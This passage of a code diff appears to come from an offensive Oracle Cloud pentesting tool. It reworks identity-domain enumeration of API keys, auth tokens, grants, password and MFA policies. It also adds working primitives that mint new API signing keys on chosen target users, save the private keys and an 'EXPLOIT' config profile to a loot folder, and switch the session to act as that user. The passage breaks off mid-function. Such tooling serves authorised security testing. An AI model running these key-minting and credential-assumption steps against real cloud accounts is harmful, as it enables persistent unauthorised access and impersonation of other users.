         print(f"\n[*] enum_idd_api_keys complete. Domains: {len(domains)} | ApiKeys: {total}")
-        return {"ok": True, "api_keys": int(total), "saved": bool(args.save)}
+        return {"ok": True, "api_keys": int(total), "saved": True}
 
     # -------------------------------------------------------------------------
     # Identity Domain auth tokens
@@ -1998,7 +1955,6 @@ class IdentityResourceSuite:
             description="Enumerate Identity Domain Auth Tokens (SCIM AuthToken) for saved Identity Domains.",
             allow_abbrev=False,
         )
-        parser.add_argument("--save", action="store_true", help="Save auth token metadata to DB.")
         parser.add_argument("--domain", required=False, help="Filter domains by substring.")
         parser.add_argument("--attributes", required=False, help="Override SCIM attributes list for list_auth_tokens().")
         parser.add_argument("--attribute-sets", action="append", default=[], help="SCIM attribute_sets (repeatable/comma-separated).")
@@ -2016,9 +1972,10 @@ class IdentityResourceSuite:
         )
         if not domains:
             print(
-                f"{UtilityTools.RED}[X] No saved identity domains found in table '{TABLE_IDENTITY_DOMAINS}'.{UtilityTools.RESET}\n"
-                "Run: modules run enum_identity --domains --save\n"
-                "Then re-run: modules run enum_identity --idd-auth-tokens --save (optional)"
+                f"{UtilityTools.YELLOW}[*] No identity domains cached; skipping "
+                f"(run 'modules run enum_identity --domains' first).{UtilityTools.RESET}\n"
+                "Run: modules run enum_identity --domains\n"
+                "Then re-run: modules run enum_identity --idd-auth-tokens (optional)"
             )
             return {"ok": False, "auth_tokens": 0}
 
@@ -2032,12 +1989,9 @@ class IdentityResourceSuite:
 
         total = 0
         for dom in domains:
-            dom_id = self._s(dom.get("id"))
-            dom_name = self._s(dom.get("display_name"))
-            dom_url = self._s(dom.get("url"))
-            dom_compartment_id = self._s(
-                dom.get("compartment_id") or dom.get("compartmentId") or compartment_id
-            )
+            dom_id = _s(dom.get("id"))
+            dom_name = _s(dom.get("display_name"))
+            dom_url = _s(dom.get("url"))
             if not dom_url:
                 continue
 
@@ -2079,14 +2033,14 @@ class IdentityResourceSuite:
             deduped: list[dict[str, Any]] = []
             seen: set[str] = set()
             for token in tokens:
-                tid = self._s(token.get("token_id"))
+                tid = _s(token.get("token_id"))
                 if not tid or tid in seen:
                     continue
                 seen.add(tid)
                 deduped.append(token)
             tokens = deduped
 
-            if args.save and tokens:
+            if tokens:
                 try:
                     ops.save_idd_auth_tokens(auth_tokens=tokens)
                 except Exception as e:
@@ -2123,7 +2077,7 @@ class IdentityResourceSuite:
             )
 
         print(f"\n[*] enum_idd_auth_tokens complete. Domains: {len(domains)} | AuthTokens: {total}")
-        return {"ok": True, "auth_tokens": int(total), "saved": bool(args.save)}
+        return {"ok": True, "auth_tokens": int(total), "saved": True}
 
     # -------------------------------------------------------------------------
     # Identity Domain grants
@@ -2133,7 +2087,6 @@ class IdentityResourceSuite:
             description="Enumerate Identity Domain Grants (SCIM Grants) for saved Identity Domains.",
             allow_abbrev=False,
         )
-        parser.add_argument("--save", action="store_true", help="Save grants to DB.")
         parser.add_argument("--domain", required=False, help="Filter domains by substring.")
         parser.add_argument("--attributes", required=False, help="Override SCIM attributes list for list_grants().")
         parser.add_argument("--all-saved-domains", action="store_true", help="Use all saved domains.")
@@ -2150,9 +2103,10 @@ class IdentityResourceSuite:
         )
         if not domains:
             print(
-                f"{UtilityTools.RED}[X] No saved identity domains found in table '{TABLE_IDENTITY_DOMAINS}'.{UtilityTools.RESET}\n"
-                "Run: modules run enum_identity --domains --save\n"
-                "Then re-run: modules run enum_identity --idd-grants --save (optional)"
+                f"{UtilityTools.YELLOW}[*] No identity domains cached; skipping "
+                f"(run 'modules run enum_identity --domains' first).{UtilityTools.RESET}\n"
+                "Run: modules run enum_identity --domains\n"
+                "Then re-run: modules run enum_identity --idd-grants (optional)"
             )
             return {"ok": False, "grants": 0}
 
@@ -2166,10 +2120,10 @@ class IdentityResourceSuite:
 
         total = 0
         for dom in domains:
-            dom_id = self._s(dom.get("id"))
-            dom_name = self._s(dom.get("display_name"))
-            dom_url = self._s(dom.get("url"))
-            dom_compartment_id = self._s(
+            dom_id = _s(dom.get("id"))
+            dom_name = _s(dom.get("display_name"))
+            dom_url = _s(dom.get("url"))
+            dom_compartment_id = _s(
                 dom.get("compartment_id") or dom.get("compartmentId") or compartment_id
             )
             if not dom_url:
@@ -2196,11 +2150,10 @@ class IdentityResourceSuite:
             principal_lookup = self._build_principal_name_lookup(domain_ocid=dom_id)
             normalized = [self._normalize_grant_row(g, principal_lookup=principal_lookup) for g in grants]
 
-            if args.save:
-                try:
-                    ops.save_idd_grants(grants=normalized, compartment_id=dom_compartment_id)
-                except Exception as e:
-                    UtilityTools.dlog(self.debug, "enum_idd_grants: save_idd_grants failed", domain_id=dom_id, err=f"{type(e).__name__}: {e}")
+            try:
+                ops.save_idd_grants(grants=normalized, compartment_id=dom_compartment_id)
+            except Exception as e:
+                UtilityTools.dlog(self.debug, "enum_idd_grants: save_idd_grants failed", domain_id=dom_id, err=f"{type(e).__name__}: {e}")
 
             print(f"\n[*] Grants for Domain: {dom_name or dom_id}")
             UtilityTools.print_limited_table(
@@ -2210,7 +2163,7 @@ class IdentityResourceSuite:
             )
 
         print(f"\n[*] enum_idd_grants complete. Domains: {len(domains)} | Grants: {total}")
-        return {"ok": True, "grants": int(total), "saved": bool(args.save)}
+        return {"ok": True, "grants": int(total), "saved": True}
 
     # -------------------------------------------------------------------------
     # Identity Domain password policies
@@ -2220,7 +2173,6 @@ class IdentityResourceSuite:
             description="Enumerate Identity Domain Password Policies (SCIM PasswordPolicies).",
             allow_abbrev=False,
         )
-        parser.add_argument("--save", action="store_true", help="Save password policies to DB.")
         parser.add_argument("--domain", required=False, help="Filter domains by substring.")
         parser.add_argument("--attributes", required=False, help="Override SCIM attributes list for list_password_policies().")
         parser.add_argument("--all-saved-domains", action="store_true", help="Use all saved domains.")
@@ -2240,9 +2192,10 @@ class IdentityResourceSuite:
         )
         if not domains:
             print(
-                f"{UtilityTools.RED}[X] No saved identity domains found in table '{TABLE_IDENTITY_DOMAINS}'.{UtilityTools.RESET}\n"
-                "Run: modules run enum_identity --domains --save\n"
-                "Then re-run: modules run enum_identity --idd-password-policies --save (optional)"
+                f"{UtilityTools.YELLOW}[*] No identity domains cached; skipping "
+                f"(run 'modules run enum_identity --domains' first).{UtilityTools.RESET}\n"
+                "Run: modules run enum_identity --domains\n"
+                "Then re-run: modules run enum_identity --idd-password-policies (optional)"
             )
             return {"ok": False, "password_policies": 0}
 
@@ -2263,10 +2216,10 @@ class IdentityResourceSuite:
 
         total = 0
         for dom in domains:
-            dom_id = self._s(dom.get("id"))
-            dom_name = self._s(dom.get("display_name"))
-            dom_url = self._s(dom.get("url"))
-            dom_compartment_id = self._s(
+            dom_id = _s(dom.get("id"))
+            dom_name = _s(dom.get("display_name"))
+            dom_url = _s(dom.get("url"))
+            dom_compartment_id = _s(
                 dom.get("compartment_id") or dom.get("compartmentId") or compartment_id
             )
             if not dom_url:
@@ -2297,11 +2250,10 @@ class IdentityResourceSuite:
                 groups = row.get("groups")
                 row["assigned_to_groups"] = "yes" if isinstance(groups, list) and len(groups) > 0 else "no"
 
-            if args.save:
-                try:
-                    ops.save_idd_password_policies(password_policies=rows, compartment_id=dom_compartment_id)
-                except Exception as e:
-                    UtilityTools.dlog(self.debug, "enum_idd_password_policies: save failed", domain_id=dom_id, err=f"{type(e).__name__}: {e}")
+            try:
+                ops.save_idd_password_policies(password_policies=rows, compartment_id=dom_compartment_id)
+            except Exception as e:
+                UtilityTools.dlog(self.debug, "enum_idd_password_policies: save failed", domain_id=dom_id, err=f"{type(e).__name__}: {e}")
 
             print(f"\n[*] Password Policies for Domain: {dom_name or dom_id}")
             UtilityTools.print_limited_table(
@@ -2311,12 +2263,90 @@ class IdentityResourceSuite:
             )
 
         print(f"\n[*] enum_idd_password_policies complete. Domains: {len(domains)} | PasswordPolicies: {total}")
-        return {"ok": True, "password_policies": int(total), "saved": bool(args.save)}
+        return {"ok": True, "password_policies": int(total), "saved": True}
+
+    def _run_idd_mfa_settings(self, user_args):
+        parser = argparse.ArgumentParser(
+            description="Enumerate Identity Domain MFA / Authentication Factor Settings (SCIM).",
+            allow_abbrev=False,
+        )
+        parser.add_argument("--domain", required=False, help="Filter domains by substring.")
+        parser.add_argument("--all-saved-domains", action="store_true", help="Use all saved domains.")
+        args = self._parse_known(parser, user_args)
+
+        compartment_id = getattr(self.session, "compartment_id", None)
+        if not args.all_saved_domains and (not isinstance(compartment_id, str) or not compartment_id):
+            print(
+                f"{UtilityTools.RED}[X] session.compartment_id is not set; "
+                f"use --all-saved-domains or select a compartment.{UtilityTools.RESET}"
+            )
+            return {"ok": False, "mfa_settings": 0}
+
+        _comp, domains, domain_source = self._load_domains_from_cache(
+            all_saved_domains=bool(args.all_saved_domains),
+            domain_filter=args.domain or "",
+        )
+        if not domains:
+            print(
+                f"{UtilityTools.YELLOW}[*] No identity domains cached; skipping "
+                f"(run 'modules run enum_identity --domains' first).{UtilityTools.RESET}\n"
+                "Run: modules run enum_identity --domains\n"
+                "Then re-run: modules run enum_identity --idd-mfa-settings (optional)"
+            )
+            return {"ok": False, "mfa_settings": 0}
+
+        print(f"\n[*] Identity Domains ({'from current run' if domain_source == 'current_run' else 'from DB cache'})")
+        UtilityTools.print_limited_table(domains, ["id", "display_name", "url", "home_region"])
+
+        total = 0
+        for dom in domains:
+            dom_id = _s(dom.get("id"))
+            dom_name = _s(dom.get("display_name"))
+            dom_url = _s(dom.get("url"))
+            dom_compartment_id = _s(
+                dom.get("compartment_id") or dom.get("compartmentId") or compartment_id
+            )
+            if not dom_url:
+                continue
+
+            ops = IdentityDomainResourceClient(session=self.session, service_endpoint=dom_url)
+            try:
+                rows = [r for r in (ops.list_authentication_factor_settings() or []) if isinstance(r, dict)]
+            except Exception as e:
+                UtilityTools.dlog(self.debug, "enum_idd_mfa_settings: list failed", domain_id=dom_id, err=f"{type(e).__name__}: {e}")
+                continue
+
+            if not rows:
+                continue
+
+            total += len(rows)
+            for row in rows:
+                ops.apply_domain_context(
+                    row,
+                    domain_id=dom_id,
+                    domain_name=dom_name,
+                    domain_url=dom_url,
+                    compartment_id=dom_compartment_id,
+                )
+
+            try:
+                ops.save_authentication_factor_settings(rows)
+            except Exception as e:
+                UtilityTools.dlog(self.debug, "enum_idd_mfa_settings: save failed", domain_id=dom_id, err=f"{type(e).__name__}: {e}")
+
+            print(f"\n[*] MFA / Authentication Factor Settings for Domain: {dom_name or dom_id}")
+            UtilityTools.print_limited_table(
+                rows,
+                ["id", "mfa_enabled_category", "mfa_enrollment_type", "totp_enabled", "push_enabled"],
+            )
+
+        print(f"\n[*] enum_idd_mfa_settings complete. Domains: {len(domains)} | MFA settings: {total}")
+        return {"ok": True, "mfa_settings": int(total), "saved": True}
 
 
 class IdentityDomainsResource(IdentityResourceSuite):
     def list(self, *, user_args):
-        return self._run_domains(user_args)
+        return self.enumerate_domains(user_args)
 
     def get(self, *, resource_id: str):
         _ = resource_id
@@ -2325,10 +2355,6 @@ class IdentityDomainsResource(IdentityResourceSuite):
     def save(self, rows):
         _ = rows
         return None
-
-    def download(self, *, resource_id: str, out_path: str) -> bool:
-        _ = (resource_id, out_path)
-        return False
 
 
 class IdentityIamResource(IdentityResourceSuite):
@@ -2343,14 +2369,10 @@ class IdentityIamResource(IdentityResourceSuite):
         _ = rows
         return None
 
-    def download(self, *, resource_id: str, out_path: str) -> bool:
-        _ = (resource_id, out_path)
-        return False
-
 
 class IdentityPrincipalsResource(IdentityResourceSuite):
     def list(self, *, user_args):
-        return self._run_principals(user_args)
+        return self.enumerate_principals(user_args)
 
     def get(self, *, resource_id: str):
         _ = resource_id
@@ -2359,10 +2381,6 @@ class IdentityPrincipalsResource(IdentityResourceSuite):
     def save(self, rows):
         _ = rows
         return None
-
-    def download(self, *, resource_id: str, out_path: str) -> bool:
-        _ = (resource_id, out_path)
-        return False
 
 
 class IdentityIddAppsResource(IdentityResourceSuite):
@@ -2377,10 +2395,6 @@ class IdentityIddAppsResource(IdentityResourceSuite):
         _ = rows
         return None
 
-    def download(self, *, resource_id: str, out_path: str) -> bool:
-        _ = (resource_id, out_path)
-        return False
-
 
 class IdentityIddAppRolesResource(IdentityResourceSuite):
     def list(self, *, user_args):
@@ -2393,10 +2407,6 @@ class IdentityIddAppRolesResource(IdentityResourceSuite):
     def save(self, rows):
         _ = rows
         return None
-
-    def download(self, *, resource_id: str, out_path: str) -> bool:
-        _ = (resource_id, out_path)
-        return False
 
 
 class IdentityIddApiKeysResource(IdentityResourceSuite):
@@ -2411,10 +2421,6 @@ class IdentityIddApiKeysResource(IdentityResourceSuite):
         _ = rows
         return None
 
-    def download(self, *, resource_id: str, out_path: str) -> bool:
-        _ = (resource_id, out_path)
-        return False
-
 
 class IdentityIddAuthTokensResource(IdentityResourceSuite):
     def list(self, *, user_args):
@@ -2427,10 +2433,6 @@ class IdentityIddAuthTokensResource(IdentityResourceSuite):
     def save(self, rows):
         _ = rows
         return None
-
-    def download(self, *, resource_id: str, out_path: str) -> bool:
-        _ = (resource_id, out_path)
-        return False
 
 
 class IdentityIddGrantsResource(IdentityResourceSuite):
@@ -2445,10 +2447,6 @@ class IdentityIddGrantsResource(IdentityResourceSuite):
         _ = rows
         return None
 
-    def download(self, *, resource_id: str, out_path: str) -> bool:
-        _ = (resource_id, out_path)
-        return False
-
 
 class IdentityIddPasswordPoliciesResource(IdentityResourceSuite):
     def list(self, *, user_args):
@@ -2462,6 +2460,733 @@ class IdentityIddPasswordPoliciesResource(IdentityResourceSuite):
         _ = rows
         return None
 
-    def download(self, *, resource_id: str, out_path: str) -> bool:
-        _ = (resource_id, out_path)
+
+class IdentityIddMfaSettingsResource(IdentityResourceSuite):
+    def list(self, *, user_args):
+        return self._run_idd_mfa_settings(user_args)
+
+    def get(self, *, resource_id: str):
+        _ = resource_id
+        return {}
+
+    def save(self, rows):
+        _ = rows
+        return None
+
+
+# =============================================================================
+# Identity principals -- User / Group / Policy write (+ live-enum) primitives
+# =============================================================================
+#
+# Every OCI identity write has a "dual path": classic OCI IAM
+# (``oci.identity.IdentityClient``) vs identity-domain/IDD
+# (``oci.identity_domains.IdentityDomainsClient``, SCIM-based, needs a domain URL).
+# Each write below is split into an explicit ``_oci``/``_idd`` method pair where the OCI
+# model actually has two paths (policies don't; there's only one classic policy engine).
+# ``User``/``Group`` also own the per-entity live-OCI-list step used by
+# ``enumerate_principals`` below (``_fetch_idd_from_domain``/``_fetch_classic``), so the
+# same class carries both its enum and mutate behavior. ``collect_all``/``resolve`` are the
+# DB-read side (turn saved rows into objects); the ``_fetch_*`` methods are the live-OCI
+# side used while populating those same tables.
+
+
+def _tenancy_and_region(session) -> Tuple[str, str]:
+    return IdentityHelperUtils.resolve_tenancy_region_from_session(session)
+
+
+def generate_rsa_keypair(key_size: int = 2048) -> Tuple[str, str]:
+    """Return ``(private_pem, public_pem)`` for a fresh RSA keypair.
+
+    Private key is unencrypted PEM (PKCS#1 ``RSA PRIVATE KEY`` -- the shape the OCI CLI/SDK
+    ``key_file`` expects); public key is ``SubjectPublicKeyInfo`` PEM (what the API wants).
+    Distinct from ``IdentityHelperUtils.generate_rsa_keypair_with_fingerprint`` (PKCS#8
+    private key + a locally-computed fingerprint, used by the credential-registration flow)
+    -- OCI's ``upload_api_key``/``create_api_key`` need PKCS#1 specifically, and the
+    fingerprint for those always comes back authoritative from the API response, not
+    computed client-side.
+    """
+    key = rsa.generate_private_key(public_exponent=65537, key_size=key_size)
+    private_pem = key.private_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PrivateFormat.TraditionalOpenSSL,
+        encryption_algorithm=serialization.NoEncryption(),
+    ).decode("utf-8")
+    public_pem = key.public_key().public_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PublicFormat.SubjectPublicKeyInfo,
+    ).decode("utf-8")
+    return private_pem, public_pem
+
+
+def read_public_pem(path: str) -> str:
+    with open(path, "r", encoding="utf-8") as fh:
+        return fh.read()
+
+
+def resolve_domain_url(
+    session, args, *, existing_url: str = "", prompt_title: str = "Identity Domains",
+    error_on_no_prompt: str = "",
+) -> str:
+    """Resolve an identity-domain endpoint URL the same way everywhere: an already-known
+    value (e.g. a resolved target/group's own ``domain_url``), else ``--domain-url``, else --
+    interactively -- let the operator pick a saved domain. When ``--yes``/``--no-prompt`` is
+    set and no URL is known yet, prints ``error_on_no_prompt`` (if given; some callers return
+    silently instead) and returns ``""``.
+    """
+    url = _s(existing_url) or _s(getattr(args, "domain_url", ""))
+    if url:
+        return url
+    if args.no_prompt:
+        if error_on_no_prompt:
+            print(f"{UtilityTools.RED}[X] {error_on_no_prompt}{UtilityTools.RESET}")
+        return ""
+    dom = choose_identity_domain(session, prompt_title=prompt_title)
+    return _s((dom or {}).get("url")) if dom else ""
+
+
+def choose_classic_or_idd(
+    *, idd: bool = False, classic: bool = False, domain_url: str = "", no_prompt: bool = False,
+    context: str = "target", error_on_no_prompt: str = "",
+) -> Optional[bool]:
+    """Resolve the classic-IAM-vs-identity-domain choice explicitly -- never silently
+    default to classic. An explicit ``--idd``/``--classic`` flag (or an already-known
+    ``domain_url``, which only makes sense for IDD) wins; otherwise, with ``--yes``/
+    ``--no-prompt`` this is an error (prints ``error_on_no_prompt`` if given), and
+    interactively it's asked directly rather than assumed. Returns True for idd, False for
+    classic, None if it couldn't be resolved (caller should abort).
+    """
+    if idd and classic:
+        print(f"{UtilityTools.RED}[X] --idd and --classic are mutually exclusive.{UtilityTools.RESET}")
+        return None
+    if idd or _s(domain_url):
+        return True
+    if classic:
         return False
+    if no_prompt:
+        msg = error_on_no_prompt or f"--yes/--no-prompt requires an explicit --idd or --classic for the {context}."
+        print(f"{UtilityTools.RED}[X] {msg}{UtilityTools.RESET}")
+        return None
+    print(f"{UtilityTools.BOLD}{UtilityTools.BRIGHT_GREEN}[*] Is the {context} classic IAM or an identity domain (IDD)?{UtilityTools.RESET}")
+    print("  [1] classic IAM")
+    print("  [2] identity domain (IDD)")
+    c = _s(input("Select 1-2: "))
+    if c == "2":
+        return True
+    if c == "1":
+        return False
+    print(f"{UtilityTools.RED}[X] Invalid selection.{UtilityTools.RESET}")
+    return None
+
+
+class _DualPathClientMixin:
+    """Shared classic-IAM / identity-domain client builders for User/Group/Policy."""
+
+    @staticmethod
+    def _classic_client(session):
+        return _init_client(oci.identity.IdentityClient, session=session, service_name="identity")
+
+    @staticmethod
+    def _idd_client(session, domain_url: str):
+        if not _s(domain_url):
+            raise ValueError("identity-domain operation requires the domain URL.")
+        return _init_client(
+            oci.identity_domains.IdentityDomainsClient,
+            session=session, service_name="identity", service_endpoint=domain_url,
+        )
+
+
+@dataclass
+class ApiKey:
+    """An API signing key minted on a ``User`` (classic or identity-domain)."""
+
+    mode: str
+    user_ocid: str
+    fingerprint: str = ""
+    key_id: str = ""
+    fell_back_from_classic: bool = False
+
+    def write_artifacts(self, session, *, private_pem: str, public_pem: str) -> Dict[str, str]:
+        """Write the private/public PEMs plus a ready-to-use OCI config profile to the loot tree.
+
+        Returns ``{private_key, public_key, config, profile_text}`` (any that were written).
+        """
+        tag = self.user_ocid.rsplit("..", 1)[-1][:24] or "user"
+        subdirs = ["exploit", "user_api_keys", tag]
+        paths: Dict[str, str] = {}
+
+        def _dest(filename: str) -> str:
+            return str(session.get_download_save_path(
+                service_name="identity", filename=filename,
+                compartment_id=_s(getattr(session, "compartment_id", "")) or "global", subdirs=subdirs,
+            ))
+
+        try:
+            priv = _dest("private_key.pem")
+            with open(priv, "w", encoding="utf-8") as fh:
+                fh.write(private_pem)
+            os.chmod(priv, 0o600)
+            paths["private_key"] = priv
+        except Exception as e:
+            print(f"{UtilityTools.RED}[X] Failed writing private key:{UtilityTools.RESET} {type(e).__name__}: {e}")
+
+        try:
+            pub = _dest("public_key.pem")
+            with open(pub, "w", encoding="utf-8") as fh:
+                fh.write(public_pem)
+            paths["public_key"] = pub
+        except Exception:
+            pass
+
+        tenancy, region = _tenancy_and_region(session)
+        fingerprint = self.fingerprint or "unknown"
+        profile = (
+            f"[EXPLOIT-{tag}]\n"
+            f"user={self.user_ocid}\n"
+            f"fingerprint={fingerprint}\n"
+            f"key_file={paths.get('private_key', '<path-to-private_key.pem>')}\n"
+            f"tenancy={tenancy or '<tenancy-ocid>'}\n"
+            f"region={region or '<region>'}\n"
+        )
+        try:
+            cfg_path = _dest("oci_config_profile.txt")
+            with open(cfg_path, "w", encoding="utf-8") as fh:
+                fh.write(profile)
+            paths["config"] = cfg_path
+        except Exception:
+            pass
+
+        paths["profile_text"] = profile
+        return paths
+
+    def assume(self, session, *, credname: str = "", private_pem: str) -> Tuple[Optional[str], Optional[str]]:
+        """Save this key as a new api-key credential and make it the active session.
+
+        Returns ``(final_credname, None)`` on success or ``(None, error)`` on failure. The
+        credname is de-duplicated if it already exists. Uses the current session's tenancy/
+        region (in a delegation session that is the target user's tenancy).
+        """
+        tenancy, region = _tenancy_and_region(session)
+        if not (tenancy and region and self.fingerprint and private_pem and self.user_ocid):
+            return None, "missing tenancy/region/fingerprint/private-key/user for assume"
+
+        base = credname or f"assumed-{self.user_ocid.rsplit('..', 1)[-1][:16]}"
+        name = base
+        try:
+            existing = {c.get("credname") for c in (session.get_all_creds() or []) if isinstance(c, dict)}
+        except Exception:
+            existing = set()
+        i = 2
+        while name in existing:
+            name = f"{base}-{i}"
+            i += 1
+
+        ok = session.add_api_key(name, {
+            "user": self.user_ocid, "fingerprint": self.fingerprint, "tenancy_id": tenancy,
+            "region": region, "private_key": private_pem,
+        })
+        if ok == 1 or ok:
+            return name, None
+        return None, "add_api_key failed (see output above)"
+
+
+class User(_DualPathClientMixin):
+    """An OCI IAM principal -- classic IAM user or identity-domain (IDD) user."""
+
+    def __init__(self, *, kind: str, ocid: str, name: str = "", scim_id: str = "",
+                 domain_ocid: str = "", domain_url: str = ""):
+        self.kind = kind
+        self.ocid = _s(ocid)
+        self.name = _s(name)
+        self.scim_id = _s(scim_id)
+        self.domain_ocid = _s(domain_ocid)
+        self.domain_url = _s(domain_url)
+
+    def label(self) -> str:
+        return f"{self.name or '<unnamed>'} | {self.kind.upper()} | {self.ocid}"
+
+    def to_dict(self) -> Dict[str, str]:
+        return {"kind": self.kind, "ocid": self.ocid, "name": self.name, "scim_id": self.scim_id,
+                "domain_ocid": self.domain_ocid, "domain_url": self.domain_url}
+
+    @classmethod
+    def from_dict(cls, d: Dict[str, Any]) -> "User":
+        return cls(kind=_s(d.get("kind")) or "classic", ocid=_s(d.get("ocid")), name=_s(d.get("name")),
+                   scim_id=_s(d.get("scim_id")), domain_ocid=_s(d.get("domain_ocid")), domain_url=_s(d.get("domain_url")))
+
+    @classmethod
+    def _manual(cls, ocid: str, *, idd: bool = False, domain_url: str = "") -> "User":
+        return cls(kind="idd" if (idd or _s(domain_url)) else "classic", ocid=_s(ocid), domain_url=_s(domain_url))
+
+    # -------------------------------------------------------------------
+    # Discovery (read from the workspace DB)
+    # -------------------------------------------------------------------
+    @classmethod
+    def collect_all(cls, session) -> List["User"]:
+        """Merged target-user list from saved enumeration: classic IAM users + domain users."""
+        out: List[User] = []
+        for r in (session.get_resource_fields(TABLE_USERS) or []):
+            if not isinstance(r, dict):
+                continue
+            ocid = _s(r.get("id"))
+            if ocid.startswith("ocid1.user"):
+                out.append(cls(kind="classic", ocid=ocid, name=_s(r.get("name") or r.get("email"))))
+
+        domain_url_by_ocid: Dict[str, str] = {}
+        for d in (session.get_resource_fields(TABLE_IDENTITY_DOMAINS) or []):
+            if isinstance(d, dict):
+                domain_url_by_ocid[_s(d.get("id"))] = _s(d.get("url"))
+
+        for r in (session.get_resource_fields(TABLE_IDD_USERS) or []):
+            if not isinstance(r, dict):
+                continue
+            ocid = _s(r.get("ocid"))
+            if not ocid.startswith("ocid1.user"):
+                continue
+            dom = _s(r.get("domain_ocid"))
+            out.append(cls(
+                kind="idd", ocid=ocid, scim_id=_s(r.get("id")), domain_ocid=dom,
+                domain_url=domain_url_by_ocid.get(dom, ""),
+                name=_s(r.get("user_name") or r.get("display_name")),
+            ))
+        return out
+
+    @classmethod
+    def resolve(cls, session, *, user_ocid: str = "", user_name: str = "", self_user: bool = False,
+                idd: bool = False, classic: bool = False, domain_url: str = "",
+                no_prompt: bool = False) -> Optional["User"]:
+        """Resolve a target user the same way everywhere: ``--self``, an explicit
+        ``--user-ocid``, ``--user-name`` (match against the workspace DB), or -- with no
+        flags -- an interactive pick-from-DB-or-manual prompt.
+
+        A target already known from the workspace DB carries its real kind, so no
+        classic/idd choice is needed there. A manually-entered OCID is genuinely
+        ambiguous -- resolved via ``choose_classic_or_idd`` rather than silently assumed
+        classic.
+        """
+        users = cls.collect_all(session)
+
+        if self_user:
+            ocid = _s(extract_active_cred_user_ocid(session))
+            if not ocid:
+                print(f"{UtilityTools.RED}[X] Could not determine the active credential's user OCID.{UtilityTools.RESET}")
+                return None
+            for u in users:
+                if u.ocid == ocid:
+                    return u
+            resolved_idd = choose_classic_or_idd(idd=idd, classic=classic, domain_url=domain_url,
+                                                 no_prompt=no_prompt, context="active user")
+            if resolved_idd is None:
+                return None
+            return cls._manual(ocid, idd=resolved_idd, domain_url=domain_url)
+
+        ocid = _s(user_ocid)
+        if ocid:
+            for u in users:
+                if u.ocid == ocid:
+                    if _s(domain_url) and not u.domain_url:
+                        u.domain_url = _s(domain_url)
+                        u.kind = "idd"
+                    return u
+            resolved_idd = choose_classic_or_idd(idd=idd, classic=classic, domain_url=domain_url,
+                                                 no_prompt=no_prompt, context="target user")
+            if resolved_idd is None:
+                return None
+            return cls._manual(ocid, idd=resolved_idd, domain_url=domain_url)
+
+        name = _s(user_name)
+        if name:
+            matches = [u for u in users if name.lower() in u.name.lower()]
+            if len(matches) == 1:
+                return matches[0]
+            if not matches:
+                print(f"{UtilityTools.RED}[X] No saved user matches name '{name}'.{UtilityTools.RESET}")
+                return None
+            if no_prompt:
+                print(f"{UtilityTools.RED}[X] '{name}' is ambiguous ({len(matches)} matches); pass --user-ocid.{UtilityTools.RESET}")
+                return None
+            return paged_search_select(matches, title=f"Users matching '{name}'", label_fn=lambda u: u.label())
+
+        if no_prompt:
+            print(f"{UtilityTools.RED}[X] --yes/--no-prompt requires --user-ocid, --user-name, or --self.{UtilityTools.RESET}")
+            return None
+
+        sel = select_from_db_or_manual(
+            rows=[u.to_dict() for u in users], entity="target user",
+            label_fn=lambda d: cls.from_dict(d).label(),
+            manual_prompt="Enter target user OCID",
+            manual_validate=lambda v: v.startswith("ocid1.user"),
+            empty_hint="Run enum_identity first, or enter a user OCID.",
+        )
+        if sel is None:
+            return None
+        kind, val = sel
+        if kind == "row":
+            return cls.from_dict(val)
+        resolved_idd = choose_classic_or_idd(idd=idd, classic=classic, domain_url=domain_url,
+                                             no_prompt=no_prompt, context="target user")
+        if resolved_idd is None:
+            return None
+        return cls._manual(val, idd=resolved_idd, domain_url=domain_url)
+
+    def _resolve_scim_id(self, session, *, domain_url: str = "") -> str:
+        """The IDD write endpoints key off the SCIM user id (not the OCID); resolve + cache
+        it if the target came from a manual OCID entry rather than the DB. ``domain_url``
+        lets a caller (e.g. Group.add_member_idd, resolving a member who may carry no
+        domain of their own) supply the domain to look the member up in, falling back to
+        ``self.domain_url``."""
+        if self.scim_id:
+            return self.scim_id
+        url = _s(domain_url) or self.domain_url
+        client = self._idd_client(session, url)
+        rows = client.list_users(filter=f'ocid eq "{self.ocid}"').data.resources or []
+        if rows and getattr(rows[0], "id", None):
+            self.scim_id = rows[0].id
+            return self.scim_id
+        raise ValueError(f"could not resolve identity-domain SCIM id for {self.ocid}")
+
+    # -------------------------------------------------------------------
+    # Live enumeration (used by enumerate_principals below)
+    # -------------------------------------------------------------------
+    @staticmethod
+    def _fetch_idd_from_domain(session, idd_ops, *, dom_id: str, dom_name: str, domain_url: str, compartment_id: str) -> List[Dict[str, Any]]:
+        """One domain's IDD users, normalized + domain-context-stamped. Raw dicts (not
+        User objects) -- the caller also needs them for membership extraction and the DB
+        save, matching enumerate_principals's existing internal shape."""
+        rows = [IdentityHelperUtils.normalize_idd_user(u) for u in (idd_ops.list_identity_domain_users() or []) if isinstance(u, dict)]
+        for r in rows:
+            idd_ops.apply_domain_context(r, domain_id=dom_id, domain_name=dom_name, domain_url=domain_url, compartment_id=compartment_id)
+        return rows
+
+    @staticmethod
+    def _fetch_classic(session, classic_ops, *, compartment_id: str) -> List[Dict[str, Any]]:
+        return classic_ops.list_users(compartment_id=compartment_id) or []
+
+    # -------------------------------------------------------------------
+    # API keys
+    # -------------------------------------------------------------------
+    def create_api_key_oci(self, session, *, public_pem: str) -> ApiKey:
+        """Upload a public key to a classic IAM user (IdentityClient.upload_api_key)."""
+        client = self._classic_client(session)
+        details = oci.identity.models.CreateApiKeyDetails(key=public_pem)
+        resp = client.upload_api_key(user_id=self.ocid, create_api_key_details=details)
+        data = oci.util.to_dict(getattr(resp, "data", None)) or {}
+        return ApiKey(mode="classic", user_ocid=self.ocid, fingerprint=_s(data.get("fingerprint")), key_id=_s(data.get("key_id")))
+
+    def create_api_key_idd(self, session, *, public_pem: str, description: str = "") -> ApiKey:
+        """Create an API key for an identity-domain user (IdentityDomainsClient.create_api_key)."""
+        if not self.domain_url:
+            raise ValueError("identity-domain user requires the domain URL (enum identity domains, or pass --domain-url).")
+        client = self._idd_client(session, self.domain_url)
+        user_ref = oci.identity_domains.models.ApiKeyUser(ocid=self.ocid or None, value=self.scim_id or None)
+        body = oci.identity_domains.models.ApiKey(
+            schemas=[IDD_API_KEY_SCHEMA], key=public_pem, user=user_ref, description=description or None,
+        )
+        resp = client.create_api_key(api_key=body)
+        data = oci.util.to_dict(getattr(resp, "data", None)) or {}
